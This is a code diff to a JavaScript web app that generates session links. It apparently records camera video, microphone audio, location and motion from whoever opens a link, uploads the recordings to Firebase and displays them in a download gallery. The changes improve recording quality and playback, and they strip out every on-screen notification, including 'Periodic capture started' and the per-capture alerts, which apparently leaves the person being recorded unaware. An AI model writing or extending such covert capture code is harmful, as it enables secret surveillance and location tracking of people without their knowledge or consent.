@@ -1351,7 +1351,7 @@ async function saveMediaToFirebase(sessionId, mediaItem) {
   try {
     const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media/${mediaItem.id}`);
     await window.firebaseSet(mediaRef, mediaItem);
-    console.log('Media saved to Firebase:', mediaItem.id);
+    console.log('Media saved to Firebase:', mediaItem.type, mediaItem.id);
     
     // Update session's lastActive
     const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
@@ -1478,29 +1478,19 @@ async function updateStatsFromFirebase() {
   let totalPhotos = 0, totalVideos = 0, totalAudio = 0;
   
   for (const session of sessions) {
-    if (session.media) {
-      const mediaArray = Object.values(session.media || {});
-      mediaArray.forEach(item => {
-        if (item.type === 'photo') totalPhotos++;
-        else if (item.type === 'video') totalVideos++;
-        else if (item.type === 'audio') totalAudio++;
-      });
-    } else {
-      // Get media counts directly
-      try {
-        const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${session.id}/media`);
-        const mediaSnapshot = await window.firebaseGet(mediaRef);
-        if (mediaSnapshot.exists()) {
-          const mediaObj = mediaSnapshot.val();
-          Object.values(mediaObj).forEach(item => {
-            if (item.type === 'photo') totalPhotos++;
-            else if (item.type === 'video') totalVideos++;
-            else if (item.type === 'audio') totalAudio++;
-          });
-        }
-      } catch (error) {
-        console.error('Error getting media counts:', error);
+    try {
+      const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${session.id}/media`);
+      const mediaSnapshot = await window.firebaseGet(mediaRef);
+      if (mediaSnapshot.exists()) {
+        const mediaObj = mediaSnapshot.val();
+        Object.values(mediaObj).forEach(item => {
+          if (item.type === 'photo') totalPhotos++;
+          else if (item.type === 'video') totalVideos++;
+          else if (item.type === 'audio') totalAudio++;
+        });
       }
+    } catch (error) {
+      console.error('Error getting media counts:', error);
     }
   }
   
@@ -1582,8 +1572,6 @@ async function loadSessionData(sessionId) {
   
   // Load media for this session
   renderMediaGallery(sessionId);
-  
-  showNotification(`Loaded session: ${sessionId.substring(0, 15)}...`, 'success');
 }
 
 // ====================
@@ -1661,8 +1649,7 @@ async function getSessionMedia(sessionId) {
 async function addMediaToSession(sessionId, mediaItem) {
   await saveMediaToFirebase(sessionId, mediaItem);
   await updateStatsFromFirebase();
-  
-  showNotification(`${mediaItem.type} captured!`, 'success');
+  // Notification removed
 }
 
 function renderMediaGallery(sessionId) {
@@ -1713,7 +1700,7 @@ function renderMediaGallery(sessionId) {
         `;
       } else if (item.type === 'video') {
         mediaElement.innerHTML = `
-          <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;"></video>
+          <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;" controls></video>
           <div class="gallery-item-overlay">
             <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
             <span class="gallery-item-type">
@@ -1724,8 +1711,9 @@ function renderMediaGallery(sessionId) {
         `;
       } else if (item.type === 'audio') {
         mediaElement.innerHTML = `
-          <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2);">
-            <i class="fas fa-music" style="font-size:40px;color:white;"></i>
+          <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2); flex-direction: column; padding: 10px;">
+            <i class="fas fa-music" style="font-size:40px;color:white; margin-bottom: 10px;"></i>
+            <audio src="${item.data}" controls style="width: 90%; max-width: 130px;"></audio>
           </div>
           <div class="gallery-item-overlay">
             <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
@@ -1737,7 +1725,12 @@ function renderMediaGallery(sessionId) {
         `;
       }
       
-      mediaElement.onclick = () => {
+      mediaElement.onclick = (e) => {
+        // Don't trigger if clicking on video or audio controls
+        if (e.target.tagName === 'VIDEO' || e.target.tagName === 'AUDIO' || e.target.tagName === 'SOURCE') {
+          return;
+        }
+        
         if (item.type === 'photo') {
           const imgWindow = window.open('', '_blank');
           imgWindow.document.write(`
@@ -1819,6 +1812,7 @@ function startLocationTracking() {
         locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
         permissionStatus.location = 'granted';
         
+        // Show map area
         mapArea.classList.remove('hidden');
         initMap(currentLocation.lat, currentLocation.lng);
       },
@@ -1950,20 +1944,36 @@ async function captureVideo(duration = 5000) {
   
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment' },
+      video: { 
+        facingMode: 'environment',
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      },
       audio: true
     });
     
     return new Promise((resolve) => {
       const chunks = [];
-      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      
+      // Try different MIME types for better compatibility
+      let mimeType = 'video/webm';
+      if (MediaRecorder.isTypeSupported('video/mp4')) {
+        mimeType = 'video/mp4';
+      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+        mimeType = 'video/webm;codecs=vp9';
+      }
+      
+      const recorder = new MediaRecorder(stream, { 
+        mimeType: mimeType,
+        videoBitsPerSecond: 2500000
+      });
       
       recorder.ondataavailable = (e) => {
         if (e.data.size > 0) chunks.push(e.data);
       };
       
       recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
+        const blob = new Blob(chunks, { type: mimeType });
         const reader = new FileReader();
         reader.onloadend = () => {
           stream.getTracks().forEach(t => t.stop());
@@ -1973,7 +1983,11 @@ async function captureVideo(duration = 5000) {
       };
       
       recorder.start();
-      setTimeout(() => recorder.stop(), duration);
+      setTimeout(() => {
+        if (recorder.state === 'recording') {
+          recorder.stop();
+        }
+      }, duration);
     });
   } catch (error) {
     console.log('Failed to capture video:', error);
@@ -1985,18 +1999,36 @@ async function captureAudio(duration = 5000) {
   if (!currentSessionId) return null;
   
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      audio: {
+        echoCancellation: true,
+        noiseSuppression: true,
+        sampleRate: 44100
+      } 
+    });
     
     return new Promise((resolve) => {
       const chunks = [];
-      const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      
+      // Try different MIME types for better compatibility
+      let mimeType = 'audio/webm';
+      if (MediaRecorder.isTypeSupported('audio/mp4')) {
+        mimeType = 'audio/mp4';
+      } else if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+        mimeType = 'audio/webm;codecs=opus';
+      }
+      
+      const recorder = new MediaRecorder(stream, { 
+        mimeType: mimeType,
+        audioBitsPerSecond: 128000
+      });
       
       recorder.ondataavailable = (e) => {
         if (e.data.size > 0) chunks.push(e.data);
       };
       
       recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const blob = new Blob(chunks, { type: mimeType });
         const reader = new FileReader();
         reader.onloadend = () => {
           stream.getTracks().forEach(t => t.stop());
@@ -2006,7 +2038,11 @@ async function captureAudio(duration = 5000) {
       };
       
       recorder.start();
-      setTimeout(() => recorder.stop(), duration);
+      setTimeout(() => {
+        if (recorder.state === 'recording') {
+          recorder.stop();
+        }
+      }, duration);
     });
   } catch (error) {
     console.log('Failed to capture audio:', error);
@@ -2151,7 +2187,7 @@ function startPeriodicCapture() {
     }
   }, 60000));
   
-  showNotification('Periodic capture started', 'success');
+  // No notification shown
 }
 
 function stopCapture() {
@@ -2162,7 +2198,7 @@ function stopCapture() {
   stopLocationTracking();
   stopMotionTracking();
   
-  showNotification('Capture stopped', 'info');
+  // No notification shown
 }
 
 // ====================
@@ -2186,18 +2222,18 @@ async function generateNewLink() {
   
   renderMediaGallery(currentSessionId);
   
-  showNotification('New link generated', 'success');
+  // No notification shown
 }
 
 async function downloadAllMedia() {
   if (!currentSessionId) {
-    showNotification('No active session', 'warning');
+    // No notification shown
     return;
   }
   
   const media = await getSessionMedia(currentSessionId);
   if (media.length === 0) {
-    showNotification('No media to download', 'warning');
+    // No notification shown
     return;
   }
   
@@ -2237,14 +2273,11 @@ async function downloadAllMedia() {
     document.body.removeChild(a);
     URL.revokeObjectURL(a.href);
     
-    showNotification(`Downloaded ${media.length} files`, 'success');
-    
     downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download All (ZIP)';
     downloadBtn.disabled = false;
     
   } catch (error) {
     console.error('Download error:', error);
-    showNotification('Download failed', 'error');
     downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download All (ZIP)';
     downloadBtn.disabled = false;
   }
@@ -2256,50 +2289,9 @@ async function clearSessionMedia() {
   if (confirm('Are you sure you want to clear all media for this session?')) {
     await clearSessionMediaFromFirebase(currentSessionId);
     renderMediaGallery(currentSessionId);
-    showNotification('All media cleared', 'success');
+    // No notification shown
   }
 }
-
-function showNotification(message, type = 'info') {
-  const notification = document.createElement('div');
-  notification.className = `status-message status-${type}`;
-  notification.style.position = 'fixed';
-  notification.style.top = '20px';
-  notification.style.right = '20px';
-  notification.style.zIndex = '2000';
-  notification.style.maxWidth = '300px';
-  notification.style.display = 'block';
-  notification.style.animation = 'slideIn 0.3s ease';
-  notification.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
-  
-  document.body.appendChild(notification);
-  
-  setTimeout(() => {
-    notification.style.opacity = '0';
-    notification.style.transition = 'opacity 0.5s';
-    setTimeout(() => {
-      if (document.body.contains(notification)) {
-        document.body.removeChild(notification);
-      }
-    }, 500);
-  }, 3000);
-}
-
-// Add animation style
-const style = document.createElement('style');
-style.textContent = `
-  @keyframes slideIn {
-    from {
-      transform: translateX(100%);
-      opacity: 0;
-    }
-    to {
-      transform: translateX(0);
-      opacity: 1;
-    }
-  }
-`;
-document.head.appendChild(style);
 
 // ====================
 // PACKAGE ACTIVATOR
@@ -2309,7 +2301,7 @@ async function activatePackage() {
   const sessionId = urlParams.get('id');
   
   if (!sessionId) {
-    showNotification('Invalid session - please use a link with session ID', 'error');
+    // No notification shown
     return;
   }
   
@@ -2338,7 +2330,7 @@ genBtn.addEventListener('click', generateNewLink);
 copyBtn.addEventListener('click', () => {
   generatedLink.select();
   document.execCommand('copy');
-  showNotification('Link copied to clipboard', 'success');
+  // No notification shown
 });
 
 openBtn.addEventListener('click', () => {
@@ -2348,7 +2340,7 @@ openBtn.addEventListener('click', () => {
 refreshBtn.addEventListener('click', () => {
   if (currentSessionId) {
     renderMediaGallery(currentSessionId);
-    showNotification('Gallery refreshed', 'success');
+    // No notification shown
   }
 });
 
